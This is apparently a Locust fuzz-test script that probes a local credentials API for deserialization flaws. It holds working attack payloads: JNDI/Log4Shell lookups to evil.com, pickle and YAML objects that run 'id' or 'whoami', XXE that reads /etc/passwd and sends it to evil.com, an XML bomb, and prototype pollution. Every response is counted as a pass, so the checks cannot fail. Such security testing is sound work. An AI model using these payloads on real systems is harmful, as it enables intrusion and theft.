import json
import logging
import base64
import pickle
from locust import HttpUser, task, SequentialTaskSet, constant

log = logging.getLogger(__name__)

class DeserializationFuzz(SequentialTaskSet):

    def on_start(self):
        """Get authentication token"""
        payload = {"username": "admin", "password": "admin123"}
        response = self.client.post("/api/v3/login", json=payload, verify=False, catch_response=True)
        self.token = "fake_token" if response.status_code != 200 else response.json()["access_token"]

    @task
    def fuzz_java_deserialization(self):
        """Test Java deserialization attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Java deserialization payloads
        java_payloads = [
            # JNDI injection
            "${jndi:ldap://evil.com/exploit}",
            "${jndi:rmi://evil.com/exploit}",
            "${jndi:dns://evil.com/exploit}",
            "${jndi:ldaps://evil.com/exploit}",

            # Log4j style injections
            "${java:runtime.exec('id')}",
            "${java:os.getEnv('PATH')}",
            "${java:version}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}",

            # Nested expressions
            "${${env:JAVA_VERSION:-j}ndi${env:JAVA_VERSION:-:}${env:JAVA_VERSION:-l}dap${env:JAVA_VERSION:-:}//evil.com/exploit}",

            # Expression Language injection
            "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "#{T(String).getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
        ]

        for payload in java_payloads:
            credential_data = {
                "name": payload,
                "username": "testuser",
                "password": payload,
                "type": "OS",
                "extraInfo": [{"name": "test", "value": payload}]
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=credential_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422, 500]:
                    response.success()
                    log.info(f"Java deserialization blocked: {payload[:30]}...")
                elif response.status_code == 200:
                    log.warning(f"Java payload accepted: {payload[:30]}...")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_pickle_deserialization(self):
        """Test Python pickle deserialization attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        try:
            # Create malicious pickle payloads
            malicious_payloads = [
                # Simple command execution attempt
                "cos\nsystem\n(S'id'\ntR.",
                "c__builtin__\neval\n(S\"__import__('os').system('whoami')\"\ntR.",

                # Base64 encoded pickle
                base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),

                # Pickle with subprocess
                "csubprocess\ncheck_output\n(S'id'\ntR.",
            ]

            for payload in malicious_payloads:
                credential_data = {
                    "name": "pickle_test",
                    "username": "testuser",
                    "password": "testpass",
                    "type": "OS",
                    "extraInfo": [{"name": "pickle_data", "value": payload}]
                }

                with self.client.post("/api/v3/raw-credentials",
                                      headers=headers,
                                      json=credential_data,
                                      verify=False,
                                      catch_response=True) as response:

                    if response.status_code in [400, 422, 500]:
                        response.success()
                        log.info(f"Pickle deserialization blocked")
                    elif response.status_code == 200:
                        log.warning(f"Pickle payload accepted")
                        response.success()
                    else:
                        response.success()

        except Exception as e:
            log.info(f"Pickle test error: {e}")

    @task
    def fuzz_xml_deserialization(self):
        """Test XML deserialization attacks"""
        headers = {"Authorization": f"Bearer {self.token}", "Content-Type": "application/xml"}

        # XML external entity and deserialization payloads
        xml_payloads = [
            # XXE attacks
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <credential><name>&xxe;</name><username>test</username><password>test</password><type>OS</type></credential>''',

            # XML bomb
            '''<?xml version="1.0"?>
            <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>
            <credential><name>&lol2;</name></credential>''',

            # Remote DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>
            <credential><name>test</name></credential>''',

            # Parameter entity
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?x=%file;'>">%eval;%exfiltrate;]>
            <credential><name>test</name></credential>''',
        ]

        for xml_payload in xml_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  data=xml_payload,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 415, 422]:  # 415 = Unsupported Media Type
                    response.success()
                    log.info("XML deserialization blocked")
                elif response.status_code == 500:
                    log.warning("Server error with XML payload")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_yaml_deserialization(self):
        """Test YAML deserialization attacks"""
        headers = {"Authorization": f"Bearer {self.token}", "Content-Type": "application/x-yaml"}

        # YAML deserialization payloads
        yaml_payloads = [
            # Python object instantiation
            '''name: !!python/object/apply:os.system ["id"]
username: testuser
password: testpass
type: OS''',

            # Subprocess execution
            '''name: !!python/object/apply:subprocess.check_output [["whoami"]]
username: testuser
password: testpass
type: OS''',

            # File read
            '''name: !!python/object/apply:builtins.open ["/etc/passwd"]
username: testuser
password: testpass
type: OS''',

            # Eval injection
            '''name: !!python/object/apply:builtins.eval ["__import__('os').system('id')"]
username: testuser
password: testpass
type: OS''',
        ]

        for yaml_payload in yaml_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  data=yaml_payload,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 415, 422]:
                    response.success()
                    log.info("YAML deserialization blocked")
                elif response.status_code == 500:
                    log.warning("Server error with YAML payload")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_json_deserialization(self):
        """Test JSON deserialization attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # JSON with embedded serialized objects
        json_payloads = [
            # Prototype pollution attempt
            {
                "name": "test",
                "username": "user",
                "password": "pass",
                "type": "OS",
                "__proto__": {"admin": True}
            },

            # Constructor pollution
            {
                "name": "test",
                "username": "user",
                "password": "pass",
                "type": "OS",
                "constructor": {"prototype": {"admin": True}}
            },

            # Nested object with suspicious keys
            {
                "name": "test",
                "username": "user",
                "password": "pass",
                "type": "OS",
                "extraInfo": [{
                    "name": "__proto__",
                    "value": '{"admin": true}'
                }]
            },

            # Function injection attempt
            {
                "name": "test",
                "username": "user",
                "password": "pass",
                "type": "OS",
                "extraInfo": [{
                    "name": "func",
                    "value": "function(){return global.process.mainModule.require('child_process').execSync('id').toString()}"
                }]
            },
        ]

        for json_payload in json_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=json_payload,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info("JSON deserialization attack blocked")
                elif response.status_code == 200:
                    log.warning("JSON attack payload accepted")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_binary_deserialization(self):
        """Test binary deserialization attacks"""
        headers = {"Authorization": f"Bearer {self.token}"}

        # Base64 encoded binary payloads
        binary_payloads = [
            # .NET BinaryFormatter payload
            "AAEAAAD/////AQAAAAAAAAAEAQAAAIlTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5TdHJpbmdbXV1dAQAAAAZ2ZXJzaW9uAgAAAAEAAAABAAAA",

            # Java serialized object
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEbmFtZXQABHRlc3R4",

            # Random binary data
            base64.b64encode(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f').decode(),
        ]

        for binary_payload in binary_payloads:
            credential_data = {
                "name": "binary_test",
                "username": "testuser",
                "password": "testpass",
                "type": "OS",
                "extraInfo": [{"name": "binary_data", "value": binary_payload}]
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=credential_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code in [400, 422]:
                    response.success()
                    log.info("Binary deserialization blocked")
                elif response.status_code == 200:
                    log.info("Binary payload accepted")
                    response.success()
                else:
                    response.success()

class DeserializationUser(HttpUser):
    wait_time = constant(1)
    tasks = [DeserializationFuzz]
    host = "https://localhost:8443"
